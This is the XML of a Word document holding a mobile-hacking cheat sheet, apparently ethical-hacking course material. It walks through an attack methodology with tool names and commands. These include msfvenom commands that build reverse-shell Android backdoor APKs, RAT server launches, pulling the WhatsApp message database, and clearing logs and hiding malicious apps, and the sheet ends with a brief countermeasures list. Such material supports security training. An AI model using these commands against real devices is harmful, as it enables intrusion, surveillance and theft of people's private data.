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Module 17 – Hacking Mobile Platforms Cheat Sheet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Mobile Hacking Methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Identify target platform (Android/iOS), version, apps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: PhoneSploit Pro, ADB (Android Debug Bridge), drozer, AppMon, Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - adb devices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - adb shell getprop ro.build.version.release</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - adb shell pm list packages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - drozer console connect</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - wireshark (capture traffic on network interface)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Vulnerability Research</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Check OS bugs, insecure app permissions, misconfigurations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: MobSF (Mobile Security Framework), QARK, Apktool, JADX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - mobsf -m 127.0.0.1:8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - qark --apk target.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - apktool d target.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - jadx-gui target.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Install malware via malicious APK/IPA, exploit permissions (camera/mic), bypass authentication, capture traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: msfvenom, Metasploit, AndroRAT, SpyNote, Evil-Droid, Bettercap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -o payload.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - use exploit/multi/handler (Metasploit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - python3 evil-droid.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - bettercap -iface wlan0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gain root/jailbreak, exploit kernel flaws.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: Magisk, KingRoot, Dirty COW exploit (Linux kernel), Frida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - frida -U -f com.target.app -l script.js --no-pause</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Data Extraction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Steal SMS, WhatsApp data, banking info.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: Andriller, WhatsApp Viewer, ADB, Oxygen Forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - adb pull /sdcard/WhatsApp/Databases/msgstore.db</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - andriller -i backup.ab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Maintaining Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backdoors, RATs (e.g., AndroRat, SpyNote).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: njRAT, DroidJack, msfvenom payloads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - java -jar AndroRatServer.jar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - msfvenom -p android/meterpreter/reverse_https LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -o backdoor.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Covering Tracks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hide malicious apps, clear logs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tools: RootCloak, HideMyApp, logcat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - adb logcat -c (clear logs)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> - pm hide com.malicious.app</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Keep OS and apps updated to patch known vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use MDM (Mobile Device Management) solutions for enterprise security.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce app whitelisting and block unauthorized installations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Restrict developer options and USB debugging (disable ADB over TCP/5555).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use strong authentication (biometrics, MFA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Encrypt sensitive data and enforce VPN usage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detect and block rooted/jailbroken devices.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Monitor network traffic for anomalies using IDS/IPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Educate users about malicious apps and phishing risks.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